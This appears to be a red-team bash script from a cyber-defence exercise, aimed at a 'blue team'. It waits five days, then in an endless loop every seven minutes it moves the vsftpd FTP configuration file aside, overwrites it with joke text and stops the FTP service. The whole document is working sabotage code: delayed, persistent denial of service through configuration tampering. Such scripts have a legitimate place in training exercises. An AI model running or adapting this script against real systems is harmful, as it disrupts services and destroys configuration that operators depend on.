#!/bin/bash

#Wait until Monday - I know this is stupid, but it ~should~ work
sleep 432000

# Loop forever
while true
do
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420

 #Generate random number, check if the number is even or odd
 if [ $(( $RANDOM % 2)) -eq 0 ]
 then
 #Copy config file to other location, then overwrite original
   cp '/etc/ssl/ftpc/ftpc.conf' '/etc/mm.conf'
   echo "I'm Batman" > '/etc/ssl/ftpc/ftpc.conf'
 else
 #Copy config file to other location, then overwrite original
   cp '/etc/ssl/ftpc/ftpc.conf' '/home/mm.conf'
   echo "You ever dance with the devil in the pale mooon light?" > '/etc/ssl/ftpc/ftpc.conf'
 fi
 
 #Stop ftp service
 sudo service vsftpd stop
done
